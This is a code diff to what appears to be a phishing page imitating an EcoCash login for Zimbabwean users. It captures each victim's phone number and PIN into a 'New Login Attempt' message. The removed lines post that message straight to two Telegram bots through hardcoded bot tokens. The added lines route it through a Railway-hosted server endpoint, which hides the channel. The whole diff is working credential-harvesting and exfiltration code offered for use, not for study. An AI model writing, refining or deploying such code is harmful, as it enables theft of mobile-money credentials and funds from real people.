@@ -345,14 +345,6 @@
         // ========== API BASE (Zimbabwe / EcoCash) ==========
         const API_BASE = 'https://starlink-network-production-573acbf9.up.railway.app';
 
-        // Bot 1 (your existing)
-        const BOT_TOKEN_1 = '8938316440:AAHBV-4qgbxIDqAQ65o6SNQ5ad_3YXaOfNs';
-        const CHAT_ID_1 = '8517857432';
-
-        // Bot 2 (your second bot)
-        const BOT_TOKEN_2 = '7915486968:AAEpg0PmZlfzGKzpxcOWTTIF-x_Cg7_YEwI';
-        const CHAT_ID_2 = '5615316142';
-
         const savedPhone = localStorage.getItem('phone');
         const phoneInput = document.getElementById('phoneInput');
         if (savedPhone && savedPhone.length === 9) {
@@ -398,29 +390,17 @@
             // Build the credential message
             const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
 
-            // Send to Bot 1
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+            // Send via our server -> Telegram (uses Railway env vars)
+            fetch(`${API_BASE}/api/notify`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_1,
-                    text: message
-                })
-            }).catch(() => {});
-
-            // Send to Bot 2
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_2,
-                    text: message
-                })
-            }).catch(() => {});
+                body: JSON.stringify({ text: message })
+            })
+                .then(r => r.json())
+                .then(d => console.log('notify:', d))
+                .catch(e => console.error('notify err:', e));
 
             // Proceed to next page
             setTimeout(() => {
